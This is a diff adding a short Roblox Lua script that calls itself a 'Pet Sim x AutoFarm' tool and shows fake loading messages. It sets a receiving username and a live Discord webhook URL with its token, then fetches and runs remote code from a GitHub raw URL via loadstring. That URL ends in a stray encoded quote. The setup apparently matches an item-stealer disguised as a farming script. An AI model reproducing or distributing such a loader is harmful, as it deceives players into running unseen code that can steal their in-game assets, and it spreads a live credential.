@@ -1,0 +1,10 @@
+Username = "balgka912"
+--Username2 = "balgka912" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/884036907330322493/38-qeN2E3M0Oz2acBmZw-ivrWnUWdjuKlURNHUcODqww5sTQB4T2zJNG4BtZ5HhSsaFE"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x AutoFarm KolPerlo"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
